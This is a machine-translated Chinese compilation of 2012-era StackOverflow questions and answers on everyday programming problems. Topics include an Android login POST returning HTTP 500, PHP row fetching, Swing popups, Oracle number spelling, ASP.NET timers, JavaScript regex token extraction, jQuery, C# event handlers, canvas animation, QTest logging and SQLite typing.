# StackOverflow 问答 10772000-10772999

# php - HttpPost android：带有名称值对的 500 服务器错误，200 好的 url 中没有名称值对

> ID：10772000
> 
> 赞同：1
> 
> 时间：2012-05-27T06:02:08.440
> 
> 标签：php, android, error-handling, name-value

我一直在尝试遵循本教程：[http](http://www.androidhive.info/2012/01/android-login-and-registration-with-php-mysql-and-sqlite/) ://www.androidhive.info/2012/01/android-login-and-registration-with-php-mysql-and-sqlite/ 。它是创建一个android登录应用程序。我已经阅读了评论，它没有明确回答发生此错误 500 服务器错误的原因以及如何解决它。

我进行了研究，一个站点建议将其放入`getJsonFromURL method`AsyncTask 中，因为它似乎在主线程上运行。但是，这与服务器错误没有区别。

当下面的代码运行时，Logcat 读出内部服务器错误 500。这意味着服务器无法理解发送给它的内容。我在 JSONParser.java 中注释掉了这一行：

```
 httpPost.setEntity(new UrlEncodedFormEntity(params)); 
```

并且该 url 与服务器一起使用并获得 200 ok 服务器响应。

我只能假设处理名称值对的方式是错误的。但是，我发现用于`List<NameValuePair>`收集登录值的每个示例都与下面的代码具有相同的实现。

您能否查看下面的代码或向我建议另一种获取名称值对以通过 POST 方法发送到服务器的方法？

// JSONParser.java

```
package library;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONException;
import org.json.JSONObject;

import android.util.Log;

public class JSONParser {

    static InputStream is = null;
    static JSONObject jObj = null;
    static String json = "";

    // constructor
    public JSONParser() {

    }

    public JSONObject getJSONFromUrl(String url, List<NameValuePair> params) {

        // Making HTTP request
        try {
            // defaultHttpClient
            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(url);
            httpPost.setEntity(new UrlEncodedFormEntity(params));
            Log.v("name value pairs ",params.toString());

            HttpResponse httpResponse = httpClient.execute(httpPost);
            HttpEntity httpEntity = httpResponse.getEntity();
            Log.v("Http Response",httpResponse.getStatusLine().toString());
            is = httpEntity.getContent();

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(
                    is, "iso-8859-1"), 8);
            StringBuilder sb = new StringBuilder();
            String line = null;
            while ((line = reader.readLine()) != null) {
                sb.append(line + "n");
            }
            is.close();
            json = sb.toString();
            Log.e("JSON", json);
        } catch (Exception e) {
            Log.e("Buffer Error", "Error converting result " + e.toString());
        }

        // try parse the string to a JSON object
        try {
            jObj = new JSONObject(json);
        } catch (JSONException e) {
            Log.e("JSON Parser", "Error parsing data " + e.toString());
        }

        // return JSON String
        return jObj;

    }
} 
```

注册活动.java：

```
package com.example.androidhive;

import org.json.JSONException;
import org.json.JSONObject;

import library.DatabaseHandler;
import library.UserFunctions;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class RegisterActivity extends Activity {
    Button btnRegister;
    Button btnLinkToLogin;
    EditText inputFullName;
    EditText inputEmail;
    EditText inputPassword;
    TextView registerErrorMsg;

    // JSON Response node names
    private static String KEY_SUCCESS = "success";
    private static String KEY_ERROR = "error";
    private static String KEY_ERROR_MSG = "error_msg";
    private static String KEY_UID = "uid";
    private static String KEY_NAME = "name";
    private static String KEY_EMAIL = "email";
    private static String KEY_CREATED_AT = "created_at";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.register);

        // Importing all assets like buttons, text fields
        inputFullName = (EditText) findViewById(R.id.registerName);
        inputEmail = (EditText) findViewById(R.id.registerEmail);
        inputPassword = (EditText) findViewById(R.id.registerPassword);
        btnRegister = (Button) findViewById(R.id.btnRegister);
        btnLinkToLogin = (Button) findViewById(R.id.btnLinkToLoginScreen);
        registerErrorMsg = (TextView) findViewById(R.id.register_error);

        // Register Button Click event
        btnRegister.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                String name = inputFullName.getText().toString();
                String email = inputEmail.getText().toString();
                String password = inputPassword.getText().toString();
                UserFunctions userFunction = new UserFunctions();
                JSONObject json = userFunction.registerUser(name, email, password);

                // check for login response
                try {
                    if (json.getString(KEY_SUCCESS) != null) {
                        registerErrorMsg.setText("");
                        String res = json.getString(KEY_SUCCESS);
                        if(Integer.parseInt(res) == 1){
                            // user successfully registred
                            // Store user details in SQLite Database
                            DatabaseHandler db = new DatabaseHandler(getApplicationContext());
                            JSONObject json_user = json.getJSONObject("user");

                            // Clear all previous data in database
                            userFunction.logoutUser(getApplicationContext());
                            db.addUser(json_user.getString(KEY_NAME), json_user.getString(KEY_EMAIL), json.getString(KEY_UID), json_user.getString(KEY_CREATED_AT));
                            // Launch Dashboard Screen
                            Intent dashboard = new Intent(getApplicationContext(), DashboardActivity.class);
                            // Close all views before launching Dashboard
                            dashboard.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            startActivity(dashboard);
                            // Close Registration Screen
                            finish();
                        }else{
                            // Error in registration
                            registerErrorMsg.setText("Error occured in registration");
                        }
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });

        // Link to Login Screen
        btnLinkToLogin.setOnClickListener(new View.OnClickListener() {

            public void onClick(View view) {
                Intent i = new Intent(getApplicationContext(),
                        LoginActivity.class);
                startActivity(i);
                // Close Registration View
                finish();
            }
        });
    }
} 
```

用户函数.java：

```
package library;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;
import android.util.Log;
import android.content.Context;

public class UserFunctions {

    private JSONParser jsonParser;

    // Testing in Leobee.com
    // use http://10.0.2.2/ to connect to your localhost ie http://localhost/

    private static String loginURL = "http://www.leobee.com/android/push/login/";
    private static String registerURL = "http://www.leobee.com/android/push/login/index.php?";

    private static String login_tag = "login";
    private static String register_tag = "register";

    // constructor
    public UserFunctions(){
        jsonParser = new JSONParser();
    }

    /**
     * function make Login Request
     * @param email
     * @param password
     * */
    public JSONObject loginUser(String email, String password){
        // Building Parameters
        List<NameValuePair> params = new ArrayList<NameValuePair>();
        params.add(new BasicNameValuePair("tag", login_tag));
        params.add(new BasicNameValuePair("email", email));
        params.add(new BasicNameValuePair("password", password));
        JSONObject json = jsonParser.getJSONFromUrl(loginURL, params);
        // return json
        // Log.e("JSON", json.toString());
        return json;
    }

    /**
     * function make Login Request
     * @param name
     * @param email
     * @param password
     * */
    public JSONObject registerUser(String name, String email, String password){
        Log.v("register user", name+ "  "+email +" " + password);
        // Building Parameters
        ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
        params.add(new BasicNameValuePair("tag", register_tag));
        params.add(new BasicNameValuePair("name", name));
        params.add(new BasicNameValuePair("email", email));
        params.add(new BasicNameValuePair("password", password));

        // getting JSON Object
        Log.v("url placed in json object", registerURL);
       // Log.v("url placed in json object",  params);
        JSONObject json = jsonParser.getJSONFromUrl(registerURL, params);
        // return json
        Log.v("JSON parser string", json.toString());
        return json;
    }

    /**
     * Function get Login status
     * */
    public boolean isUserLoggedIn(Context context){
        DatabaseHandler db = new DatabaseHandler(context);
        int count = db.getRowCount();
        if(count > 0){
            // user logged in
            return true;
        }
        return false;
    }

    /**
     * Function to logout user
     * Reset Database
     * */
    public boolean logoutUser(Context context){
        DatabaseHandler db = new DatabaseHandler(context);
        db.resetTables();
        return true;
    }

} 
```

使用名称值对记录 cat 500 错误：

```
05-27 05:47:07.342: V/register user(409): Name  email@email.com pass
05-27 05:47:07.353: V/url placed in json object(409): http://www.leobee.com/android/push/login/index.php?
05-27 05:47:07.362: V/name value pairs(409): [tag=register, name=Name, email=email@email.com, password=pass]
05-27 05:47:08.493: V/Http Response(409): HTTP/1.1 500 Internal Server Error
05-27 05:47:08.803: E/JSON Parser(409): Error parsing data org.json.JSONException: End of input at character 0 of 
05-27 05:47:08.803: D/AndroidRuntime(409): Shutting down VM
05-27 05:47:08.803: W/dalvikvm(409): threadid=1: thread exiting with uncaught exception (group=0x40015560)
05-27 05:47:08.824: E/AndroidRuntime(409): FATAL EXCEPTION: main
05-27 05:47:08.824: E/AndroidRuntime(409): java.lang.NullPointerException
05-27 05:47:08.824: E/AndroidRuntime(409):  at library.UserFunctions.registerUser(UserFunctions.java:68)
05-27 05:47:08.824: E/AndroidRuntime(409):  at com.example.androidhive.RegisterActivity$1.onClick(RegisterActivity.java:55)
05-27 05:47:08.824: E/AndroidRuntime(409):  at android.view.View.performClick(View.java:2485)
05-27 05:47:08.824: E/AndroidRuntime(409):  at android.view.View$PerformClick.run(View.java:9080)
05-27 05:47:08.824: E/AndroidRuntime(409):  at android.os.Handler.handleCallback(Handler.java:587)
05-27 05:47:08.824: E/AndroidRuntime(409):  at android.os.Handler.dispatchMessage(Handler.java:92)
05-27 05:47:08.824: E/AndroidRuntime(409):  at android.os.Looper.loop(Looper.java:130)
05-27 05:47:08.824: E/AndroidRuntime(409):  at android.app.ActivityThread.main(ActivityThread.java:3683)
05-27 05:47:08.824: E/AndroidRuntime(409):  at java.lang.reflect.Method.invokeNative(Native Method)
05-27 05:47:08.824: E/AndroidRuntime(409):  at java.lang.reflect.Method.invoke(Method.java:507)
05-27 05:47:08.824: E/AndroidRuntime(409):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
05-27 05:47:08.824: E/AndroidRuntime(409):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
05-27 05:47:08.824: E/AndroidRuntime(409):  at dalvik.system.NativeStart.main(Native Method) 
```

Logcat 200 ok，没有名称值对：

```
05-27 05:51:39.863: D/dalvikvm(444): GC_EXTERNAL_ALLOC freed 70K, 49% free 2778K/5379K, external 2032K/2137K, paused 40ms
05-27 05:51:46.415: W/KeyCharacterMap(444): No keyboard for id 0
05-27 05:51:46.415: W/KeyCharacterMap(444): Using default keymap: /system/usr/keychars/qwerty.kcm.bin
05-27 05:52:06.862: V/register user(444): no  value@pairs.com url
05-27 05:52:06.862: V/url placed in json object(444): http://www.leobee.com/android/push/login/index.php?
05-27 05:52:06.883: V/name value pairs(444): [tag=register, name=no, email=value@pairs.com, password=url]
05-27 05:52:07.893: V/Http Response(444): HTTP/1.1 200 OK
05-27 05:52:07.902: E/JSON(444): Access Deniedn
05-27 05:52:07.912: E/JSON Parser(444): Error parsing data org.json.JSONException: Value Access of type java.lang.String cannot be converted to JSONObject
05-27 05:52:07.912: D/AndroidRuntime(444): Shutting down VM
05-27 05:52:07.912: W/dalvikvm(444): threadid=1: thread exiting with uncaught exception (group=0x40015560)
05-27 05:52:07.923: E/AndroidRuntime(444): FATAL EXCEPTION: main
05-27 05:52:07.923: E/AndroidRuntime(444): java.lang.NullPointerException
05-27 05:52:07.923: E/AndroidRuntime(444):  at library.UserFunctions.registerUser(UserFunctions.java:68)
05-27 05:52:07.923: E/AndroidRuntime(444):  at com.example.androidhive.RegisterActivity$1.onClick(RegisterActivity.java:55)
05-27 05:52:07.923: E/AndroidRuntime(444):  at android.view.View.performClick(View.java:2485)
05-27 05:52:07.923: E/AndroidRuntime(444):  at android.view.View$PerformClick.run(View.java:9080)
05-27 05:52:07.923: E/AndroidRuntime(444):  at android.os.Handler.handleCallback(Handler.java:587)
05-27 05:52:07.923: E/AndroidRuntime(444):  at android.os.Handler.dispatchMessage(Handler.java:92)
05-27 05:52:07.923: E/AndroidRuntime(444):  at android.os.Looper.loop(Looper.java:130)
05-27 05:52:07.923: E/AndroidRuntime(444):  at android.app.ActivityThread.main(ActivityThread.java:3683)
05-27 05:52:07.923: E/AndroidRuntime(444):  at java.lang.reflect.Method.invokeNative(Native Method)
05-27 05:52:07.923: E/AndroidRuntime(444):  at java.lang.reflect.Method.invoke(Method.java:507)
05-27 05:52:07.923: E/AndroidRuntime(444):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
05-27 05:52:07.923: E/AndroidRuntime(444):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
05-27 05:52:07.923: E/AndroidRuntime(444):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T06:54:46.637

注册用户时，您似乎遇到了访问被拒绝错误，导致您的应用程序崩溃。

尝试以下方法：

*   去掉注册网址末尾的问号。
*   你应该声明那些私有的最终静态，因为 url 不会改变
*   使用 apache common io 中的 IOUtils.toString 将实体转换为字符串，您的实现不是那么好，您使用的缓冲区太小。更喜欢使用 Apache 项目来完成此类任务。
*   打印您从服务器收到的内容，很可能服务器响应的内容不是 json。

# php - mysql php在没有while循环的情况下访问三行

> ID：10772001
> 
> 赞同：-1
> 
> 时间：2012-05-27T06:02:16.057
> 
> 标签：php, mysql, rows

此查询始终产生三行。

```
$Z   = $myquery->execute($v); 
$row = mysql_fetch_array($Z); 
```

我不想做一个while循环..我怎么能作为变量访问。

例如

```
 $row1 = the 1st column of row1
 $row2 = the 1st column of row1
 $row3 = the 1st column of row1 
```

我认为这样的事情会奏效吗？

```
$row1 = $row[0][0]; 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T06:21:12.107

没有什么说 fetch 函数只能在循环条件下调用。在语言级别上，限制在给定上下文中可以调用什么函数的唯一[因素](http://php.net/manual/en/language.oop5.typehinting.php)是对另一个函数的参数的类型提示，并且该限制是表达式的类型，而不是表达式本身。通常，如果可以在给定上下文中调用函数，则可以在该上下文中调用任何函数。

mysqli：

```
$query = $db->prepare('...');
$query->bind_param(...);
$query->execute();
$result = $query->get_result();
$rows[] = $result->fetch_array();
$rows[] = $result->fetch_array();
$rows[] = $result->fetch_array(); 
```

PDO：

```
$query = $db->prepare('...');
$query->execute(...);
$row[] = $query->fetch();
$row[] = $query->fetch();
$row[] = $query->fetch(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T06:07:31.313

```
$row1 = mysql_fetch_row();
$row2 = mysql_fetch_row();
$row3 = mysql_fetch_row(); 
```

# java - 如何防止 JPopupMenu 关闭？

> ID：10772006
> 
> 赞同：2
> 
> 时间：2012-05-27T06:04:34.687
> 
> 标签：java, swing

我创建了一个“日期选择器”组件，它只是一个控制器（`JComponent`）和一个显示器（`JPopupMenu`扩展）。当用户使用箭头控制日期时，我希望显示弹出窗口继续显示。我尝试调用按钮`popup.show(...)`以`mouseReleased`尝试重置弹出窗口，但之后它并没有像往常一样隐藏。我怎样才能在保持 的通常行为的同时实现这一点`JPopupMenu`？

当然我可以使用`JWindow`，但是我不得不担心模拟`JPopupMenu`使用焦点等的显示/隐藏行为，这是我非常想避免的。

谢谢你。:)

![在此处输入图像描述](../Images/a8ce75728a6605a7553d54ad6fc6591a.png)

**SSCCEE**

```
import java.awt.Dimension;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import javax.swing.*;

public class PopupSSCCE {

    private JFrame frame = new JFrame();
    private JPanel controller = new JPanel();
    private JLabel controllerLabel = new JLabel("Controller");
    private JLabel display = new JLabel("Display");
    private JPopupMenu popup = new JPopupMenu();
    private JButton prev = new JButton("<");
    private JButton next = new JButton(">");

    private PopupSSCCE() {
        controllerLabel.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseReleased(MouseEvent e) {
                if (controllerLabel.contains(e.getPoint()))
                    popup.show(controllerLabel, -50, controllerLabel.getHeight());
            }
        });

        frame.setPreferredSize(new Dimension(250, 300));
        popup.setPreferredSize(new Dimension(200, 200));
        controller.setPreferredSize(new Dimension(200, 50));
        prev.setPreferredSize(new Dimension(50, 50));
        next.setPreferredSize(new Dimension(50, 50));
        controllerLabel.setPreferredSize(new Dimension(100, 50));

        controller.add(prev);
        controller.add(controllerLabel);
        controller.add(next);
        popup.add(display);
        frame.getContentPane().add(controller);

        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        new PopupSSCCE();
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T06:27:48.710

*   不要使用`JPopup`或`Popup`容器作为 non_homework 代码的基础，

*   from`Java4`无法从 JComboBox、JMenu、JPopupMenu 管理“在屏幕上停留弹出窗口”，[更多请点击此处](http://tips4java.wordpress.com/2009/05/17/combo-box-no-action/)

*   使用 Toedter 的存在和 non_buggy 代码[或](https://stackoverflow.com/users/203657/kleopatra)kleopatra[制作](http://toedter.com/)的[SwingX](http://weblogs.java.net/blog/kschaefe/archive/2012/02/02/swingx-163-released)

*   重要的是不要尝试重新发明轮子

# oracle - 如何使用 oracle sql 将 10 设为 10

> ID：10772007
> 
> 赞同：2
> 
> 时间：2012-05-27T06:04:42.020
> 
> 标签：oracle

如何使用 Oracle Sql 将 10 设为 10？例如：20 等于 20 1000 等于千

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-27T06:13:56.300

```
select your_col, (to_char(to_date(your_cold,'j'), 'jsp')) from your_table; 
```

应该[做的伎俩](http://asktom.oracle.com/pls/asktom/f?p=100:11:0%3a%3a%3a%3aP11_QUESTION_ID:18305103094123)。虽然它对数字的大小有限制，但[此处提供](http://asktom.oracle.com/pls/asktom/f?p=100:11:0%3a%3a%3a%3aP11_QUESTION_ID:1407603857650)的解决方法涉及更多 - 想法是将您的数字按三位数分组，使用上述技巧转换这些数字并添加适当的“量词”（*千*、*百万*、*十亿*等）。

# asp.net - 想在 ASP.net 中的时间间隔后调用函数

> ID：10772010
> 
> 赞同：0
> 
> 时间：2012-05-27T06:05:49.583
> 
> 标签：asp.net, web-services, scheduling

我的问题是我在我的网站上实现了一个功能，当我按下按钮时它会搜索特定的推文。我希望它使其自动化，这样，无论有人是否使用该网站，该功能每两分钟一次又一次地被调用。我只有一个空间的想法。比如使用网络服务。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T06:22:10.350

您可以做的是在 Global.asax 中添加一个 System.Timers.Timer。

```
System.Threading.Timer timer = new System.Threading.Timer(new TimerCallback(TimerElapsed), null, new Timespan(0), new Timespan(24, 0, 0));

// This will run every 24 hours.
private void TimerElapsed(object o)
{
    // Do stuff.
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-11T18:48:55.230

您可以使用在 global.asax 中声明的计时器，如下所示：

```
void Application_Start(object sender, EventArgs e)
{
    System.Timers.Timer timer = new System.Timers.Timer();
    timer.Interval = 2000 * 60;
    timer.Elapsed += Myhandler;
    timer.Start();

    Application.Add("timer", timer);
}

static void Myhandler(object sender, System.Timers.ElapsedEventArgs e)
{
} 
```

# javascript - 使用 javascript 从 URL 中提取特定变量

> ID：10772015
> 
> 赞同：0
> 
> 时间：2012-05-27T06:06:33.557
> 
> 标签：javascript, regex

如何使用 javascript .match() 在我的 URL 中获取 access_token 变量？

```
http://www.facebook.com/connect/login_success.html#access_token=pYBACn8NQeCAVWgiaFG4ZD&expires_in=0 
```

非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T06:12:25.567

```
var url = 'http://www.facebook.com/connect/login_success.html#access_token=pYBACn8NQeCAVWgiaFG4ZD&expires_in=0';
var token = url.split("#")[1].match(/access_token=([^&]+)/)[1]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T10:06:51.817

与 Parth 的解决方案相同，但没有拆分并且更严格：

```
var url = 'http://www.facebook.com/connect/login_success.html#access_token=pYBACn8NQeCAVWgiaFG4ZD&expires_in=0';
var token = url.match(/(?:#|#.+&)access_token=([^&]+)/)[1]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T10:21:03.203

与尤金的相同，但如果匹配失败不会抛出异常

```
var url = 'http://www.facebook.com/connect/login_success.html#access_token=pYBACn8NQeCAVWgiaFG4ZD&expires_in=0';
var token = (url.match(/(?:#|#.+&)access_token=([^&]+)/) || ['', null])[1]; 
```

如果 URL 中不存在令牌，则返回 null

# javascript - javascript函数多次调用

> ID：10772019
> 
> 赞同：-3
> 
> 时间：2012-05-27T06:07:10.313
> 
> 标签：javascript, jquery

在我的javascript代码中（太长了，所以我不能放在这里），函数不止一次调用，比如假设：

```
 $("#button").bind({ click : Call }); // bind the Call with button click event

 function Call()
 {
   alert("This message shows me more than once when i clicked the button");
 } 
```

如果此警报消息多次显示我，则表示函数`Call()`多次调用。谁能猜出或告诉我我的代码中发生了什么？（请不要问我代码）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T06:11:32.670

为我工作：http: [//jsfiddle.net/aC8Bm/](http://jsfiddle.net/aC8Bm/)

我猜你在某个地方不止一次绑定。

另外，我建议要么从 Call 函数返回 false，要么停止事件传播。

还有一件事：避免使用大写来命名函数——按照惯例，这是为构造函数保留的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T06:14:49.810

您将事件处理程序连接到按钮调用“呼叫”的次数。您在模板或部分文件中是否有此代码？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T06:35:14.703

而不是在任何函数中执行此操作：

```
$("#button").bind({ click : Call }); 
```

将以下内容放在外面的某个地方：

```
$("#button").live("click", Call); 
```

它将为所有现有的和曾经添加的 #button 绑定一次

# c# - 如何了解在 for 循环期间运行的方法？

> ID：10772020
> 
> 赞同：1
> 
> 时间：2012-05-27T06:07:18.850
> 
> 标签：c#, loops

我有一个`for`循环，每次通过我调用相同的方法。我需要找到一种方法来了解之前的等式是什么。我必须在不使用增量值的情况下找到它。例如：

```
for (int i = 0; i < 101; i++) { 
    checkBox[i].Click += new System.EventHandler(checkBoxMethod); } 
```

在这种情况下，应该以某种方式`checkBoxMethod`获得前一个函数，例如：

```
checkBox[50].Click 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T06:12:58.267

在 for 循环内部，还要设置每个复选框的标签。我假设您在这里使用的是 Windows 窗体。所以，这是修改后的 for 循环的样子：

```
for (int i = 0; i < 101; i++) {
    checkBox[i].Click += new System.EventHandler(checkBoxMethod);
    checkBox[i].Tag = i;
} 
```

然后在您的事件处理程序中，您可以将 sender 变量转换为一个复选框，如下所示：

```
void checkBoxMethod (object sender, EventArgs args)
{
    CheckBox box = (CheckBox)sender;
    int number = (int)box.Tag;
} 
```

在创建该复选框的事件处理程序时，无论“i”是什么，都将在变量“number”中检索，您可以随意使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T06:33:15.330

不要使用`for`循环，而是使用递归并将当前计数传递给函数：

```
void checkBoxMethod (object sender, EventArgs args)
{
    CheckBox box = (CheckBox)sender;
    int number = (int)box.Tag;
    myRecursiveMethod(number);
}

private void myRecursiveMethod(int count)
{
    //do whatever stuff I need to do

    if (!timeToExitTheMethod)
        myRecursiveMethod(count++);
} 
```

您没有向我们解释您在循环中到底在做什么，**而且**`for`您的问题没有多大意义（即您提到的 CheckBox 是什么？），所以我不能对我的代码非常具体例子。请注意，您必须为递归方法编写一个退出点（否则它将被调用，直到出现堆栈溢出）。

如果您只是想计算调用函数的次数，请执行以下操作：

```
public class MyClass
{
    private int _myCounter = 0;

    void checkBoxMethod (object sender, EventArgs args)
    {
        CheckBox box = (CheckBox)sender;

        //do whatever you need to do

        _myCounter++;
    }

} 
```

如果您对您的要求更具体，那么我们可以更具体地提出我们的建议。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T08:32:07.003

您可以使用 lambda experssions 将所需的信息传递给处理程序。

```
 for (int i = 0; i < n; i++) {
        int number = i;
        buttons[i].Click += (sender, args) => OnButtonClick(sender, args, number);
    }
...
    private void OnButtonClick(object sender, RoutedEventArgs e, int number) {
        MessageBox.Show(number.ToString(CultureInfo.InvariantCulture));
    } 
```

# jquery - Jquery prependTo 添加显示：块

> ID：10772021
> 
> 赞同：2
> 
> 时间：2012-05-27T06:07:22.603
> 
> 标签：jquery, css, prepend

似乎无法找到这个问题的答案。

我的代码如下所示：

```
var new_img = '<img id="' + drag_id + '" rel="' + drop_id + '" class="' + gallery_link + ' drop_out" src="' + drag_src + '" />';

var drop_img = '<div id="' + ($(ui.draggable).attr("id")) + '" class="not-droppable" rel="' + drop_id + '">' + new_img + '</div>';

$(drop_img).hide().prependTo('li[id=' + drop_id + ']').fadeIn(2000); 
```

当其中`div`带有图像的 被添加到 时，`LI`它会添加`style:display-block`到`div`. 我该如何做到这一点，以便前面的元素`div`不会像这个元素一样添加元素？`style``class``display: inline-block`

我尝试将上面标签上的`style`元素设置为; 但是，这随后更改为. 如果我尝试将样式表中的 CSS 设置为，则变为.`div``display: inline-block``display: block``display: inline-block``!important``div``style``display-none`

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T06:11:30.980

```
$(drop_img)
    .css('display','none')
    .prependTo('li[id=' + drop_id + ']')
    .fadeIn(2000); 
```

[`.hide()`](http://api.jquery.com/hide)适用于已经在 DOM 中的元素。

# html - 如何使html5动画流畅？

> ID：10772023
> 
> 赞同：0
> 
> 时间：2012-05-27T06:07:42.403
> 
> 标签：html

我正在为我的动画使用画布和 webkitrequestAnimation 框架。但是，动画是即时的，而不是流畅的。它太快了，我看不到任何动画。如何使动画流畅？

```
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Wave 2</title>

</head>
<body>
<canvas id="canvas" width="400" height="400"></canvas>

<script>
window.onload = function () {
var canvas = document.getElementById('canvas'),
context = canvas.getContext('2d'),
angle = 0,
range = 50,
centerY = canvas.height / 2,
xspeed = 1,
yspeed = 0.05,
xpos = 0,
ypos = centerY;
context.lineWidth = 2;
(function drawFrame () {
window.webkitrequestAnimationFrame(drawFrame, canvas);

context.beginPath();
context.moveTo(xpos, ypos);
//Calculate the new position.
xpos += xspeed;
angle += yspeed;
ypos = centerY + Math.sin(angle) * range;
context.lineTo(xpos, ypos);
context.stroke();
}());
};
</script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:03:45.547

除了第 24 行的语法错误外，这对我来说按预期工作：

```
window.webkitrequestAnimationFrame(drawFrame, canvas);

window.webkitRequestAnimationFrame(drawFrame, canvas); 
```

查看此页面上的答案：[如何使用 requestAnimationFrame](https://stackoverflow.com/questions/5605588/how-to-use-requestanimationframe)

它将指导您编写适用于所有兼容 Web 浏览器的请求动画函数，而不仅仅是那些基于 webkit 构建的浏览器。如果您使用的浏览器不是 Safari 或 Chrome，这可能会解释任何不稳定的行为。

我想在这里提倡[createjs.com](http://www.createjs.com)，因为它们为处理 HTML5 画布和动画提供了出色的 API。查看演示和源代码！

# unit-testing - 如何从 QTestLib/QTest 获取有关测试失败的信息

> ID：10772024
> 
> 赞同：3
> 
> 时间：2012-05-27T06:07:49.257
> 
> 标签：unit-testing, qt, qtestlib

我正在使用 QTestLib 库和 QTest 来运行我的单元测试。我正在使用 Windows 7 并使用带有 MVSC 2010 编译器的 Qt 4.8。当我使用以下方法运行测试时：

```
QTest::qExec(TestDateDD/whateverTestClass); 
```

我在控制台中得到输出：

```
********* Start testing of TestDateDD *********
    Config: Using QTest library 4.8.0, Qt 4.8.0
    PASS   : TestDateDD::initTestCase()
    PASS   : TestDateDD::testValidity()
    FAIL!  : TestDateDD::testMonth(2012/7/10) Compared values are not the same
    Actual (date.longMonthName(date.month())): July
    Expected (monthname): June
    ..\UnitTestingPlugiin\TestDateDD.cpp(38) : failure location
    PASS   : TestDateDD::cleanupTestCase()
    Totals: 3 passed, 1 failed, 0 skipped
    ********* Finished testing of TestDateDD ********* 
```

但是，我的要求是在我的 GUI 中为每个测试槽显示此消息。我做了一些研究，发现[qtestlog.cpp](http://qt.gitorious.org/qt/qt/blobs/HEAD/src/testlib/qtestlog.cpp)使用自己的 messageHandler 来管理测试输出并将结果显示为 PASS 或 FAIL 以及失败消息、行号等。有什么方法可以处理 QTest 的这个 messageHandler我的 GUI 应用程序？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-29T00:20:01.927

无法更改记录器的功能。QAbstractTestLogger 被硬编码为输出到文件或标准输出，您不能将自己的实现提供给 QTestLog。

您可以将标准输出重定向到您的文本框，或者您可以`-o filename`在调用文件时指定为参数`QTest::qExec`并在文件被写出时读回文件。

但是，我建议您将测试编译成单独的可执行文件并使用`QProcess`. 它继承`QIODevice`并且将其数据发送到您的窗口应该不难。

使用的其他几个好处是`QProcess`单元测试中的崩溃或断言不会降低您的 GUI，并且您将能够同时运行多个测试而不会混淆您的输出。

# sqlite - 接受字符串值和整数值的布尔数据类型

> ID：10772028
> 
> 赞同：2
> 
> 时间：2012-05-27T06:08:34.930
> 
> 标签：sqlite, boolean

具有布尔列的表，布尔值应该只接受值 0 或 1，但它接受 int 值以及字符串值。

这是表模式 -

```
CREATE TABLE maintable_slave ( din INTEGER, strip_no integer, strip_status boolean); 
```

这是我正在更新列的查询-

```
update maintable_slave set strip_status = 5 where din = 1;

update maintable_slave set strip_status = 'add' where din = 1; 
```

这里 strip_status 布尔列接受字符串和整数值。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T06:12:09.667

这是一个经常被问到的问题——它确实在[SQLite 的 FAQ](http://sqlite.org/faq.html#q3)中：

> **(3) SQLite 让我在整数类型的数据库列中插入一个字符串！**
> 
